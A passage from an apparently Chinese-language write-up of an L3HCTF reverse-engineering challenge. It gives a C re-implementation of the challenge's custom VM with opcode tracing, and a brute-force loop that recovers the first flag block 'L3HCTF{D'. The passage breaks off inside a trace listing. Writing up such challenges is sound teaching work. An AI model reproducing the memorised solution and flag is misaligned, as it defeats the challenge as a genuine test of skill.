index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">opcode = pKey[st-&gt;i];<span class="comment">//取出对应的opcode</span></span><br><span class="line">st-&gt;i++;<span class="comment">//每取出一个opcode， 索引就+1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------&gt;OPCODE :%d\n&quot;</span>, opcode);</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (opcode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">data1 = pFlag[st-&gt;stack];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1 + data2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = pFlag[%d]:%#x + pFlag[%d]:%#x;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, st-&gt;stack, data1, st-&gt;stack - <span class="number">1</span>, data2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">data1 = pFlag[st-&gt;stack];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1 - data2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = pFlag[%d]:%#x - pFlag[%d]:%#x;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, st-&gt;stack, data1, st-&gt;stack - <span class="number">1</span>, data2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">data1 = pFlag[st-&gt;stack];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1 * data2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = pFlag[%d]:%#x * pFlag[%d]:%#x;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, st-&gt;stack, data1, st-&gt;stack - <span class="number">1</span>, data2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">data1 = pFlag[st-&gt;stack];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1 / data2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = pFlag[%d]:%#x / pFlag[%d]:%#x;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, st-&gt;stack, data1, st-&gt;stack - <span class="number">1</span>, data2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">data1 = pFlag[st-&gt;stack];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1 % data2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = pFlag[%d]:%#x %% pFlag[%d]:%#x;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, st-&gt;stack, data1, st-&gt;stack - <span class="number">1</span>, data2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">data1 = pFlag[st-&gt;stack];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1 &amp; data2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = pFlag[%d]:%#x &amp; pFlag[%d]:%#x;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, st-&gt;stack, data1, st-&gt;stack - <span class="number">1</span>, data2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">data1 = pFlag[st-&gt;stack];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1 | data2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = pFlag[%d]:%#x | pFlag[%d]:%#x;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, st-&gt;stack, data1, st-&gt;stack - <span class="number">1</span>, data2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">data1 = pFlag[st-&gt;stack];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1 ^ data2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = pFlag[%d]:%#x ^ pFlag[%d]:%#x;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, st-&gt;stack, data1, st-&gt;stack - <span class="number">1</span>, data2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line">tmp = pFlag[st-&gt;stack];</span><br><span class="line">index = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">pFlag[index] = tmp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = %#x;\n&quot;</span>, index, tmp);</span><br><span class="line">st-&gt;stack--;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">index = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">data1 = pFlag[index];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = %#x;\n&quot;</span>, st-&gt;stack <span class="number">-1</span>, data1);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">tmp = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = 1;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = 0;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">tmp = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)tmp &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = 1;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = 0;\n&quot;</span>, st-&gt;stack - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">data1 = pFlag[st-&gt;stack - <span class="number">1</span>];</span><br><span class="line">data2 = pFlag[st-&gt;stack - <span class="number">2</span>];</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">1</span>] = data2;</span><br><span class="line">pFlag[st-&gt;stack - <span class="number">2</span>] = data1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;exchange pFlag[%d]:%#x, pFlag[%d]:%#x\n&quot;</span>, st-&gt;stack - <span class="number">1</span>, data2, st-&gt;stack - <span class="number">2</span>, data1);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">st-&gt;stack--;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">tmp = *(_DWORD*)&amp;pKey[st-&gt;i];</span><br><span class="line">st-&gt;i += <span class="number">4</span>;</span><br><span class="line">pFlag[st-&gt;stack++] = tmp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pFlag[%d] = %#x\n&quot;</span>, st-&gt;stack<span class="number">-1</span>, tmp);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">tmp = *(_DWORD*)&amp;pKey[st-&gt;i];</span><br><span class="line">index = st-&gt;i + <span class="number">4</span> + tmp;</span><br><span class="line">st-&gt;i = index;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">tmp = st-&gt;i + <span class="number">4</span>;</span><br><span class="line">st-&gt;stack--;</span><br><span class="line"><span class="keyword">if</span> (pFlag[st-&gt;stack])</span><br><span class="line">tmp += *(_DWORD*)&amp;pKey[st-&gt;i];</span><br><span class="line">st-&gt;i = tmp;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">tmp = *(_DWORD*)&amp;pKey[st-&gt;i];</span><br><span class="line">st-&gt;stack += tmp;</span><br><span class="line">st-&gt;i += <span class="number">4</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">st-&gt;i += <span class="number">4</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">st-&gt;i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag1[<span class="number">4000</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//前40个字节使用户输入的flag，40往后是为了加密flag用到的数据</span></span><br><span class="line"><span class="keyword">char</span> flag2[<span class="number">4000</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//前40个字节使用户输入的flag，40往后是为了加密flag用到的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> compare_date[<span class="number">1000</span>] = &#123;</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xFA</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x01</span>, <span class="number">0x41</span>, <span class="number">0x3E</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0xAD</span>,</span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0x16</span>, <span class="number">0xBE</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x2A</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x51</span>, <span class="number">0x01</span>, <span class="number">0x94</span>, <span class="number">0x66</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0xEB</span>, <span class="number">0xBF</span>,</span><br><span class="line">  <span class="number">0x5F</span>, <span class="number">0x2F</span>, <span class="number">0x98</span>, <span class="number">0x63</span>, <span class="number">0xD3</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xE3</span>, <span class="number">0xEE</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">struc_1 v12 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">struc_1 v13 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(flag1, <span class="string">&quot;111111111111222211111111111111111111111\0&quot;</span>, <span class="number">40</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(flag2, <span class="string">&quot;111111111111222211111111111111111111111\0&quot;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">v12.pFlag = (_DWORD *)flag1;</span><br><span class="line">v12.pKey = key1;</span><br><span class="line">v12.i = <span class="number">0</span>;</span><br><span class="line">v12.stack = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">v13.pFlag = (_DWORD*)flag2;</span><br><span class="line">v13.pKey = key2;</span><br><span class="line">v13.i = <span class="number">0</span>;</span><br><span class="line">v13.stack = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0XCA</span>; i+=<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">enc_flag</span>(&amp;v12);</span><br><span class="line"><span class="built_in">memcpy</span>(flag2, flag1, <span class="number">40</span>);</span><br><span class="line"><span class="built_in">enc_flag</span>(&amp;v13);</span><br><span class="line"><span class="built_in">memcpy</span>(flag1, flag2, <span class="number">40</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试发现，flag是分组进行加密的,每8个字符一组，共5组</p><p>第一组 <code>L3HCTF&#123;*</code>, 只差1个字符, 暴力破解</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">char</span> compare_date[] = &#123;</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xFA</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x01</span>, <span class="number">0x41</span>, <span class="number">0x3E</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0xAD</span>,</span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0x16</span>, <span class="number">0xBE</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x2A</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x51</span>, <span class="number">0x01</span>, <span class="number">0x94</span>, <span class="number">0x66</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0xEB</span>, <span class="number">0xBF</span>,</span><br><span class="line">  <span class="number">0x5F</span>, <span class="number">0x2F</span>, <span class="number">0x98</span>, <span class="number">0x63</span>, <span class="number">0xD3</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xE3</span>, <span class="number">0xEE</span>, <span class="number">0x79</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">struc_1 v12 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">struc_1 v13 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(flag1, <span class="string">&quot;111111111111111111111111111111111111111\0&quot;</span>, <span class="number">40</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(flag2, <span class="string">&quot;111111111111111111111111111111111111111\0&quot;</span>, <span class="number">40</span>);</span><br><span class="line">v12.pFlag = (_DWORD*)flag1;</span><br><span class="line">v12.pKey = key1;</span><br><span class="line">v12.i = <span class="number">0</span>;</span><br><span class="line">v12.kk = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">v13.pFlag = (_DWORD*)flag2;</span><br><span class="line">v13.pKey = key2;</span><br><span class="line">v13.i = <span class="number">0</span>;</span><br><span class="line">v13.kk = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(flag1, <span class="string">&quot;L3HCTF&#123;1&quot;</span>, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(flag2, <span class="string">&quot;L3HCTF&#123;1&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v12.pFlag = (_DWORD*)flag1;</span><br><span class="line">v12.pKey = key1;</span><br><span class="line">v12.i = <span class="number">0</span>;</span><br><span class="line">v12.kk = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">v13.pFlag = (_DWORD*)flag2;</span><br><span class="line">v13.pKey = key2;</span><br><span class="line">v13.i = <span class="number">0</span>;</span><br><span class="line">v13.kk = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(flag1, <span class="string">&quot;L3HCTF&#123;&quot;</span>, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(flag2, <span class="string">&quot;L3HCTF&#123;&quot;</span>, <span class="number">8</span>);</span><br><span class="line">flag1[<span class="number">7</span>] = j;</span><br><span class="line">flag2[<span class="number">7</span>] = j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0XCA</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">enc_flag</span>(&amp;v12);</span><br><span class="line"><span class="built_in">memcpy</span>(flag2, flag1, <span class="number">40</span>);</span><br><span class="line"><span class="built_in">enc_flag</span>(&amp;v13);</span><br><span class="line"><span class="built_in">memcpy</span>(flag1, flag2, <span class="number">40</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span>(flag1, compare_date, <span class="number">8</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, j);</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//D</span></span><br></pre></td></tr></table></figure><p>发现第一组是<code>L3HCTF&#123;D</code></p><p>然后下面开始还原VM，只需还原出加密每一组的第一个循环就OK</p><p>输入flag 为 <code>L3HCTF&#123;D1111222211111111111111111111111</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第二组为</span><br><span class="line">Input:  31 31 31 31 32 32 32 32</span><br><span class="line">enc后</span><br><span class="line">Output: ec 9d 57 67 94 6a 7e a5</span><br></pre></td></tr></table></figure><p>通过打印的日志，追踪Input，来分析如何得到的Output</p><p><strong>加密flag的第二组的第一个循环的日志</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span 